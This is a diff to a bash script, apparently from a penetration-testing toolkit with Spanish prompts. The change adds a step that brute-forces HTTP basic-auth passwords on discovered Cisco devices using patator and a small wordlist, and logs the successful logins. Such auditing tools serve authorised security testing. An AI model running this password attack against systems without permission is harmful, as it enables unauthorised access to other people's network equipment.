@@ -76,7 +76,28 @@ fi
 
 echo "postgres" >> top.txt	
 echo "mysql" >> top.txt	
+echo "cisco" >> top.txt	
 
+
+
+if [ -f .services/cisco.txt ]
+then
+
+	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+		then       	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
+		for ip in $(cat .services/cisco.txt); do
+			echo -e "\n\t########### $ip #######"			
+			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-80-ciscoPassword.txt
+			grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt > vulnerabilities/$ip-80-ciscoPassword.txt
+			echo ""			
+		done
+	 fi	
+fi
 
 if [ -f .services/Windows.txt ]
 then
